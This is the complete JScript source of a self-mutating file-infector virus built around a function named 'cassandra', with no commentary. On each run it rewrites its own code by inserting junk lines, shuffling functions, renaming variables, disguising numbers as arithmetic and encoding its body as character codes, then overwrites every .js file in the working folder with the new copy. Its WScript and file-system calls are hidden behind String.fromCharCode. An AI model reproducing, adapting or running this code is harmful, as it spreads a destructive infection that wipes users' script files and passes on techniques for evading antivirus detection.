cassandra()
function cassandra()
{
  code=''; nl=String.fromCharCode(13,10);
  fileall=varsd(2).OpenTextFile(varsd(1)).ReadAll(); start=19;
  if (fileall.charAt(0)=='e' && Math.round(Math.random()*6)==1) { decrypt(fileall, fileall.substring(25, fileall.length-2), '') }
  if (fileall.charAt(0)!='e')
  {
    start-=10;
    if (Math.round(Math.random()*2)==1) { Trash(''); }
    if (Math.round(Math.random()*2)==1) { bodychange('cassandra()'+nl,0,0,0,0,0,0,0,0,0,0,0,0); }
    if (Math.round(Math.random()*2)==1) { varchange(); }
  }
  if (Math.round(Math.random()*start)==1) { CodeToChar('eval(String.fromCharCode('); }
  code=numberchange('')
  infectit(code)
}

function numberchange(code)
{
  fileall=varsd(2).OpenTextFile(varsd(1),1).ReadAll()
  fileb=varsd(2).OpenTextFile(varsd(1),1)
  for (i=0; i<fileall.length; i++)
  {
    sign=fileb.Read(1)
    checka=1;
    if (sign.charCodeAt(0)>47 && sign.charCodeAt(0)<58)
    {
      checka=0; code=findfullnumber(sign, code)
    }
    if (checka) { code+=sign; }
  }
  fileb.Close()
  fileb=varsd(2).OpenTextFile(varsd(1),2)
  fileb.Write(code)
  fileb.Close()
  return(code)
}

function findfullnumber(sign, code)
{
  numbber=sign;
  for (j=i; j<fileall.length; j++)
  {
    checky=1; sign=fileb.Read(1); i++;
    if (sign.charCodeAt(0)>47 && sign.charCodeAt(0)<58 || sign=='.') { numbber+=sign; checky=0;}
    if (checky==1) { j=fileall.length }
  }
  checky=Math.round(Math.random()*4)
  if (checky==1)
  {
    calc=Math.round(Math.random()*2)+1;
    randon=Math.round(Math.random()*10)+1; 
    if (calc==1) { newnum='('+(numbber-randon)+'+'+randon+')' }
    if (calc==2) { newnum='('+(numbber/1+randon)+'-'+randon+')' }
    if (calc==3) { newnum='('+(numbber*randon)+'/'+randon+')' } 
    code+=newnum+sign;
  }
  if (checky!=1) { code+=numbber+sign }
  return(code)
}

function CodeToChar(code)
{
  fileall=varsd(2).OpenTextFile(varsd(1),1).ReadAll()
  fileb=varsd(2).OpenTextFile(varsd(1),2)
  code+=fileall.charCodeAt(0)
  for (i=1; i<fileall.length; i++)
  {
    code+=','+fileall.charCodeAt(i)
  }
  code+='))'
  fileb.Write(code)
  fileb.Close()
}

function Trash(code)
{
  fileall=varsd(2).OpenTextFile(varsd(1)).ReadAll()
  fileb=varsd(2).OpenTextFile(varsd(1),1)
  for (i=0; i<fileall.length;)
  {
    sign=fileb.ReadLine(); checky=0
    for (j=0; j<sign.length; j++)
    {
      if (sign.charCodeAt(j)==123 && sign.lenght==j+1) { checky=1; }
    }
    i+=sign.length+2
    if (checky==0 && Math.round(Math.random()*3)==1)
    {
      randon=Math.round(Math.random()*5)+1
      if (randon==1) { code+='var '+trashname('')+'='+String.fromCharCode(39)+trashname('')+String.fromCharCode(39)+nl;}
      if (randon==2) { code+='// '+trashname('')+nl;}
      if (randon==3 || randon==4) { code+='var '+trashname('')+'='+Math.round(Math.random()*9999999)+nl;}
      if (randon==5) { code+='if ('+Math.round(Math.random()*999)+'=='+Math.round(Math.random()*999)+') { '+trashname("")+'() }'+nl }
      if (randon==6) { wsfn=trashname(''); code+='for ('+wsfn+'=0; '+wsfn+'>'+Math.round(Math.random()*999)+'; '+wsfn+'++) { '+trashname("")+'() }'+nl }
    }
    code+=sign+nl;
  } 
  fileb.Close()
  fileb=varsd(2).OpenTextFile(varsd(1),2)
  fileb.Write(code)
  fileb.Close()
}

function trashname(namea)
{
  for (j=0; j<Math.round(Math.random()*15)+5; j++) { namea+=String.fromCharCode(Math.round(Math.random()*25)+97) }
  return(namea)
}

function bodychange(code, randb, randc, randd, rande, randf, randg, randh, randi, randj, randk, randl, randm)
{
  fileb=varsd(2).OpenTextFile(varsd(1),1);
  randa=0;
  for (randa=0; randa+randb+randc+randd+rande+randf+randg+randh+randi+randj+randk+randl+randm<13;)
  {
    cont='';
    randon=Math.round(Math.random()*13)
    if (randon==0) { if (randa!=1) { cont='function numberchange(code)'; randa=1; } }
    if (randon==1) { if (randb!=1) { cont='function findfullnumber(sign, code)'; randb=1; } }
    if (randon==2) { if (randc!=1) { cont='function CodeToChar(code)'; randc=1; } }
    if (randon==3) { if (randd!=1) { cont='function Trash(code)'; randd=1 } }
    if (randon==4) { if (rande!=1) { cont='function trashname(namea)'; rande=1; } }
    if (randon==5) { if (randf!=1) { cont='function bodychange(code, randb, randc, randd, rande, randf, randg, randh, randi, randj, randk, randl, randm)'; randf=1; } }
    if (randon==6) { if (randg!=1) { cont='function bodycb(cont, code)'; randg=1; } }
    if (randon==7) { if (randh!=1) { cont='function varchange()'; randh=1; } }
    if (randon==8) { if (randi!=1) { cont='function changeit(code, wrte)'; randi=1; } }
    if (randon==9) { if (randj!=1) { cont='function varsd(varnum)'; randj=1; } }
    if (randon==10) { if (randk!=1) { cont='function decrypt(fileall, coda, code)'; randk=1; } }
    if (randon==11) { if (randl!=1) { cont='function cassandra()'; randl=1; } }
    if (randon==12) { if (randm!=1) { cont='function infectit(code)'; randm=1; } }
    if (cont!='') { code=bodycb(cont, code+cont+nl) }
  }
  fileb.Close()
  fileb=varsd(2).OpenTextFile(varsd(1),2)
  fileb.Write(code)
  fileb.Close()
}

function infectit(code)
{
  iFolders=varsd(2).GetFolder(varsd(2).GetFolder('.'))
  iFiles=new Enumerator(iFolders.Files)
  for (; !iFiles.atEnd(); iFiles.moveNext())
  {
    if (varsd(2).GetExtensionName(iFiles.item()).toUpperCase()=='JS') 
    {
      fileb=varsd(2).OpenTextFile(iFiles.item(),2).Write(code);
    }
  }
}

function bodycb(cont, code)
{
  for (i=0; i<666; i++)
  {
    sign=fileb.ReadLine();
    if (sign==cont)
    {
      for (j=0; j<666; j++)
      {
        sign=fileb.ReadLine();
        code+=sign+nl;
        if (sign=='}') { j=666; i=j; }
      }
    }
  }
  fileb.Close();
  fileb=varsd(2).OpenTextFile(varsd(1),1)
  return(code)
}

function varchange()
{
  for (i=0; i<47; i++)
  {
    code=changeit('','')
    fileb=varsd(2).OpenTextFile(varsd(1),2)
    fileb.Write(code)
    fileb.Close()
  }
}

function changeit(code, wrte)
{
  var changevars=new Array('Trash','bodychange','CodeToChar','infectit','numberchange','iFolders','randm','iFiles','randk','namea','randl','findfullnumber','changeit','trashname','bodycb','varchange','cangeit','fileb','fileall','code','nl','checka','checky','randon','randa','randb','randc','randd','rande','randf','randg','randh','randi','randj','sign','numbber','cassandra','cont','changevars','wrte','wsfn','varsd','varnum','start','coda','codsplit','decrypt')
  fileall=varsd(2).OpenTextFile(varsd(1),1).ReadAll()
  fileb=varsd(2).OpenTextFile(varsd(1),1)
  randon=trashname('')
  for (j=0; j<fileall.length; j++)
  {
    checky=1;
    wrte=fileb.Read(1)
    if (wrte==changevars[i].substring(0,1))
    {
      for (k=1; k<changevars[i].length; k++) 
      { 
        wrte+=fileb.Read(1); j++;
        if (wrte!=changevars[i].substring(0,k+1)) { k=changevars[i].length }
      }
    }
    if (wrte==changevars[i]) { code+=randon; checky=0; }
    if (checky) { code+=wrte }
  }
  return(code)
}

function varsd(varnum)
{
  if (varnum==1) { return(eval(String.fromCharCode(87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101))) }
  if (varnum==2) { return(eval(String.fromCharCode(87,83,99,114,105,112,116,46,67,114,101,97,116,101,79,98,106,101,99,116,40,39,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,39,41,59,32))) }
}

function decrypt(fileall, coda, code)
{
  codsplit=coda.split(',')
  for (i=0; i<codsplit.length; i++) { code+=String.fromCharCode(eval(codsplit[i])) }
  fileb=varsd(2).OpenTextFile(varsd(1),2); fileb.Write(code); fileb.Close();
}